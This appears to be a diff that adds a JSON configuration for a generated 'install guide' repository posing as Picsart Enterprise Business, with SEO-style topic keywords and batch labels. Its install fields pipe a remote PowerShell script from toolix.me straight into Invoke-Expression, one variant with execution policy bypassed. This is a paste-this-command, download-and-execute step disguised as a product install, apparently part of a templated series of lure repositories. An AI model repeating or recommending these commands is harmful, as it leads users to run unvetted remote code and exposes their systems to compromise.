@@ -1,0 +1,27 @@
+{
+  "repo": "Picsart-Enterprise-Business-Full",
+  "product": "Picsart Enterprise Business Full",
+  "product_title": "Picsart Enterprise Business",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "creative",
+  "topics": [
+    "how-to-install-picsart-enterprise-business",
+    "picsart-enterprise-business-app",
+    "creative-workflow",
+    "visual-design",
+    "design-software",
+    "image-editing",
+    "picsart-enterprise-business-creative-tool",
+    "picsart-enterprise-business-design-tool",
+    "picsart-enterprise-business",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
